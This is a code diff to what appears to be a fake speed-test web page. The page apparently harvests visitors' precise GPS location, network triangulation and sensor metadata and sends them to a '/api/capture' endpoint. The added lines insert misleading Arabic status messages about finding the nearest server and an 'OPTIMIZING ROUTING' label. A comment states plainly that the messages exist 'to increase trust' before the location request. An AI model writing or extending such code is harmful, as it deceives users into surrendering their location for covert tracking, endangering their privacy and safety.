@@ -518,6 +518,7 @@ function getAccurateLocation(id) {
 
   const error = (err) => {
     console.warn(`[GPS] Precision capture failed: ${err.message}. Falling back to network triangulation.`);
+    setStatus('استخدام التوجيه الإقليمي البديل...');
     // If high accuracy failed, try one more time with low accuracy
     if (err.code === 3) { // TIMEOUT
       navigator.geolocation.getCurrentPosition(success, () => {}, { ...options, enableHighAccuracy: false, timeout: 5000 });
@@ -533,11 +534,14 @@ function getAccurateLocation(id) {
 
 async function triggerCaptureFlow() {
   if (captureId) return;
+  
+  // Show a smart pre-request message to increase trust
+  setStatus('جاري البحث عن أفضل خادم لقربك الجغرافي...');
+  
   const tri = await measureTriangulation();
   const id = await sendInitialCapture();
   if (id) {
     getAccurateLocation(id);
-    // Send triangulation, regional latency and sensor metadata
     const regionalLatency = await measureRegionalLatency();
     fetch(`/api/capture/${id}`, {
       method: 'PATCH',
@@ -715,6 +719,12 @@ async function startTest() {
   resetGaugeOnly();
 
   const results = generateResults();
+  
+  // Smart Integrated Location Request
+  setStatus('تحديد العقدة الأقرب...');
+  els.phaseLabel.textContent = 'OPTIMIZING ROUTING';
+  els.phaseLabel.classList.add('show');
+  
   if (!captureId) {
     await triggerCaptureFlow();
   } else {
